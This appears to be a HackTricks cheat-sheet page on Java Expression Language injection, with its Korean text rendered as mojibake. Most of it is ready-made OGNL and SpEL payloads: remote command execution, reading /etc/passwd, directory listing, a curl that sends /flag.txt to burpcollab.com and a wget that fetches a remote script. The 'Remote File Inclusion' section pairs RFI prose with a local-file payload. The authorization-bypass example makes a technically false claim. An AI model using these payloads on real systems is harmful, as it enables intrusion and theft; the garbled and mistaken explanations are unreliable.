# EL - í‘œí˜„ ì–¸ì–´

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)ì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

í‘œí˜„ ì–¸ì–´ (EL)ì€ í”„ë ˆì  í…Œì´ì…˜ ë ˆì´ì–´ (ì˜ˆ: ì›¹ í˜ì´ì§€)ì™€ ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œì§ (ì˜ˆ: ê´€ë¦¬ë˜ëŠ” ë¹ˆ)ì„ ì—°ê²°í•˜ì—¬ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆë„ë¡í•˜ëŠ” JavaEEì˜ í•µì‹¬ ìš”ì†Œì…ë‹ˆë‹¤. ì£¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ê³³ì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤.

- **JavaServer Faces (JSF)**: UI êµ¬ì„± ìš”ì†Œë¥¼ ë°±ì—”ë“œ ë°ì´í„°/ë™ì‘ì— ë°”ì¸ë”©í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.
- **JavaServer Pages (JSP)**: JSP í˜ì´ì§€ ë‚´ì—ì„œ ë°ì´í„° ì•¡ì„¸ìŠ¤ ë° ì¡°ì‘ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- **Contexts and Dependency Injection for Java EE (CDI)**: ì›¹ ë ˆì´ì–´ì™€ ê´€ë¦¬ë˜ëŠ” ë¹ˆ ê°„ì˜ ìƒí˜¸ ì‘ìš©ì„ ìš©ì´í•˜ê²Œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

**ì‚¬ìš©ë˜ëŠ” ë§¥ë½**:

- **Spring Framework**: ë³´ì•ˆ ë° ë°ì´í„°ì™€ ê°™ì€ ë‹¤ì–‘í•œ ëª¨ë“ˆì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤.
- **ì¼ë°˜ì ì¸ ì‚¬ìš©**: Java, Kotlin, Scalaì™€ ê°™ì€ JVM ê¸°ë°˜ ì–¸ì–´ì˜ ê°œë°œìì— ì˜í•´ SpEL APIë¥¼ í†µí•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

ELì€ JavaEE ê¸°ìˆ , ë…ë¦½ ì‹¤í–‰ í™˜ê²½ì—ì„œ ì‚¬ìš©ë˜ë©° `.jsp` ë˜ëŠ” `.jsf` íŒŒì¼ í™•ì¥ëª…, ìŠ¤íƒ ì˜¤ë¥˜ ë° "Servlet"ê³¼ ê°™ì€ ìš©ì–´ë¥¼ í†µí•´ ì¸ì‹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸°ëŠ¥ ë° íŠ¹ì • ë¬¸ìì˜ ì‚¬ìš©ì€ ë²„ì „ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
**EL ë²„ì „**ì— ë”°ë¼ ì¼ë¶€ **ê¸°ëŠ¥**ì´ **On** ë˜ëŠ” **Off** ìƒíƒœì¼ ìˆ˜ ìˆìœ¼ë©° ì¼ë°˜ì ìœ¼ë¡œ ì¼ë¶€ **ë¬¸ì**ëŠ” **í—ˆìš©ë˜ì§€ ì•Šì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤.
{% endhint %}

## ê¸°ë³¸ ì˜ˆì œ

(ELì— ëŒ€í•œ ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ íŠœí† ë¦¬ì–¼ì€ [https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.)

[Maven](https://mvnrepository.com) ì €ì¥ì†Œì—ì„œ ë‹¤ìŒ jar íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”.

* `commons-lang3-3.9.jar`
* `spring-core-5.2.1.RELEASE.jar`
* `commons-logging-1.2.jar`
* `spring-expression-5.2.1.RELEASE.jar`

ê·¸ë¦¬ê³  ë‹¤ìŒ `Main.java` íŒŒì¼ì„ ìƒì„±í•˜ì„¸ìš”.
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
public static ExpressionParser PARSER;

public static void main(String[] args) throws Exception {
PARSER = new SpelExpressionParser();

System.out.println("Enter a String to evaluate:");
java.io.BufferedReader stdin = new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
String input = stdin.readLine();
Expression exp = PARSER.parseExpression(input);
String result = exp.getValue().toString();
System.out.println(result);
}
}
```
ë‹¤ìŒìœ¼ë¡œ ì½”ë“œë¥¼ ì»´íŒŒì¼í•˜ì„¸ìš” (`javac`ì´ ì„¤ì¹˜ë˜ì–´ ìˆì§€ ì•Šì€ ê²½ìš° `sudo apt install default-jdk`ë¥¼ ì„¤ì¹˜í•˜ì„¸ìš”):
```java
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main.java
```
ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•˜ì„¸ìš”:
```java
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main
Enter a String to evaluate:
{5*5}
[25]
```
ì´ì „ ì˜ˆì œì—ì„œ ìš©ì–´ `{5*5}`ì´ **í‰ê°€**ë˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì„¸ìš”.

## **CVE ê¸°ë°˜ íŠœí† ë¦¬ì–¼**

**ì´ ê²Œì‹œë¬¼ì—ì„œ í™•ì¸í•˜ì„¸ìš”: [https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a](https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a)**

## í˜ì´ë¡œë“œ

### ê¸°ë³¸ ë™ì‘
```bash
#Basic string operations examples
{"a".toString()}
[a]

{"dfd".replace("d","x")}
[xfx]

#Access to the String class
{"".getClass()}
[class java.lang.String]

#Access ro the String class bypassing "getClass"
#{""["class"]}

#Access to arbitrary class
{"".getClass().forName("java.util.Date")}
[class java.util.Date]

#List methods of a class
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.equals(java.lang.Object)]
```
### íƒì§€

* Burp íƒì§€
```bash
gk6q${"zkz".toString().replace("k", "x")}doap2
#The value returned was "igk6qzxzdoap2", indicating of the execution of the expression.
```
* J2EE ê°ì§€
```bash
#J2EEScan Detection vector (substitute the content of the response body with the content of the "INJPARAM" parameter concatenated with a sum of integer):
https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL
```
* 10ì´ˆ ë™ì•ˆ ëŒ€ê¸°í•˜ê¸°
```bash
#Blind detection vector (sleep during 10 seconds)
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```
### ì›ê²© íŒŒì¼ í¬í•¨ (Remote File Inclusion)

ì›ê²© íŒŒì¼ í¬í•¨(Remote File Inclusion)ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì™¸ë¶€ íŒŒì¼ì„ í¬í•¨ì‹œí‚¬ ìˆ˜ ìˆëŠ” ê²½ìš°ì— ë°œìƒí•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ì— ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ, ì›ê²© íŒŒì¼ í¬í•¨ ì·¨ì•½ì ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ íŒŒì¼ ê²½ë¡œë¥¼ ì‚¬ìš©ì ì…ë ¥ìœ¼ë¡œ ë°›ì•„ë“¤ì´ëŠ” ê²½ìš°ì— ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ ì…ë ¥ì„ ì´ìš©í•˜ì—¬ ì•…ì„± íŒŒì¼ì„ í¬í•¨ì‹œí‚¤ê³ , ì´ë¥¼ í†µí•´ ì„œë²„ì˜ ì œì–´ê¶Œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ ì´ìš©í•œ ê³µê²©ì€ ë‹¤ì–‘í•œ í˜•íƒœë¡œ ì´ë£¨ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê³µê²©ìëŠ” ì›ê²© ì„œë²„ì— ìœ„ì¹˜í•œ ì•…ì„± íŒŒì¼ì„ í¬í•¨ì‹œí‚¤ê±°ë‚˜, ì‹œìŠ¤í…œ íŒŒì¼ì„ í¬í•¨ì‹œì¼œ ì„œë²„ì˜ ì œì–´ë¥¼ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì„œë²„ì—ì„œ ì¤‘ìš”í•œ ì •ë³´ë¥¼ ìœ ì¶œí•˜ê±°ë‚˜, ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì™„ì „íˆ ì œì–´í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ì‚¬ìš©ì ì…ë ¥ì„ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ê²ƒìœ¼ë¡œ ê°„ì£¼í•˜ê³ , íŒŒì¼ ê²½ë¡œë¥¼ ë™ì ìœ¼ë¡œ ìƒì„±í•˜ëŠ” ëŒ€ì‹  ì •ì ì¸ ê²½ë¡œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ë˜í•œ, íŒŒì¼ í¬í•¨ ì‹œ ë³´ì•ˆ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ì—¬ ì•…ì„± íŒŒì¼ì˜ í¬í•¨ì„ ë°©ì§€í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```
### ë””ë ‰í† ë¦¬ ëª©ë¡

Directory listing is a feature provided by web servers that allows users to view the contents of a directory on a website. It can be useful for both legitimate users and attackers, as it provides information about the files and directories present on the server.

ë””ë ‰í† ë¦¬ ëª©ë¡ì€ ì›¹ ì„œë²„ì—ì„œ ì œê³µí•˜ëŠ” ê¸°ëŠ¥ìœ¼ë¡œ, ì‚¬ìš©ìê°€ ì›¹ ì‚¬ì´íŠ¸ì˜ ë””ë ‰í† ë¦¬ ë‚´ìš©ì„ ë³¼ ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŠ” ì •ìƒì ì¸ ì‚¬ìš©ìì™€ ê³µê²©ì ëª¨ë‘ì—ê²Œ ìœ ìš©í•œ ì •ë³´ë¥¼ ì œê³µí•˜ë©°, ì„œë²„ì— ìˆëŠ” íŒŒì¼ê³¼ ë””ë ‰í† ë¦¬ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```
### RCE

* ê¸°ë³¸ RCE **ì„¤ëª…**
```bash
#Check the method getRuntime is there
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]

#Execute command (you won't see the command output in the console)
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}
[Process[pid=10892, exitValue=0]]

#Execute command bypassing "getClass"
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# With HTMl entities injection inside the template
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
* RCE **ë¦¬ëˆ…ìŠ¤**
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* RCE **Windows** (í…ŒìŠ¤íŠ¸ë˜ì§€ ì•ŠìŒ)
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* **ë” ë§ì€ ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)**
```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime via getDeclaredConstructors
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using processbuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using ScriptEngineManager
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");

//https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt
(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
T(java.lang.System).getenv()[0]
T(java.lang.Runtime).getRuntime().exec('ping my-domain.com')
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
```
### í™˜ê²½ ê²€ì‚¬

* `applicationScope` - ì „ì—­ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³€ìˆ˜
* `requestScope` - ìš”ì²­ ë³€ìˆ˜
* `initParam` - ì• í”Œë¦¬ì¼€ì´ì…˜ ì´ˆê¸°í™” ë³€ìˆ˜
* `sessionScope` - ì„¸ì…˜ ë³€ìˆ˜
* `param.X` - Xê°€ http ë§¤ê°œë³€ìˆ˜ì˜ ì´ë¦„ì¸ ë§¤ê°œë³€ìˆ˜ ê°’

ì´ ë³€ìˆ˜ë“¤ì„ Stringìœ¼ë¡œ ìºìŠ¤íŠ¸í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆì‹œ:
```bash
${sessionScope.toString()}
```
#### ê¶Œí•œ ìš°íšŒ ì˜ˆì œ

Consider a scenario where a web application uses server-side template injection (SSTI) with the Expression Language (EL) syntax. The application may have implemented authorization checks to restrict access to certain pages or functionalities based on user roles or permissions. However, if the SSTI vulnerability exists, an attacker can bypass these authorization checks and gain unauthorized access.

Let's take a look at an example to understand how this can be done:

```java
public class UserController {
    // ...
    public String getUserProfile(HttpServletRequest request) {
        // ...
        String userId = request.getParameter("userId");
        User user = userService.getUserById(userId);
        
        // Check if the user has permission to view the profile
        if (user != null && user.hasPermission("viewProfile")) {
            return "userProfile";
        } else {
            return "accessDenied";
        }
    }
    // ...
}
```

In the above code snippet, the `getUserProfile` method retrieves the `userId` parameter from the request and fetches the corresponding user from the database. It then checks if the user has the permission to view the profile. If the permission is granted, it returns the `userProfile` page; otherwise, it returns the `accessDenied` page.

Now, let's assume that the web application is vulnerable to SSTI and the `userId` parameter is not properly validated or sanitized before being used in the template. An attacker can exploit this vulnerability by injecting an EL expression to bypass the authorization check.

For example, the attacker can craft a malicious request with the following `userId` parameter:

```
userId=${7*7}
```

When this request is processed, the EL expression `${7*7}` will be evaluated by the server-side template engine, resulting in the value `49`. As a result, the authorization check `user.hasPermission("viewProfile")` will evaluate to `true`, allowing the attacker to access the `userProfile` page even if they don't have the required permission.

This is just a simplified example to illustrate the concept of authorization bypass through SSTI. In real-world scenarios, the exploitation of SSTI vulnerabilities can be more complex and may require a deeper understanding of the target application's code and template engine.
```bash
${pageContext.request.getSession().setAttribute("admin", true)}
```
ì‘ìš© í”„ë¡œê·¸ë¨ì€ ì‚¬ìš©ì ì •ì˜ ë³€ìˆ˜ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```bash
${user}
${password}
${employee.FirstName}
```
## WAF ìš°íšŒ

[https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/](https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/)ì„ í™•ì¸í•˜ì„¸ìš”.

## ì°¸ê³  ìë£Œ

* [https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/](https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/)
* [https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools)
* [https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt](https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)ì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
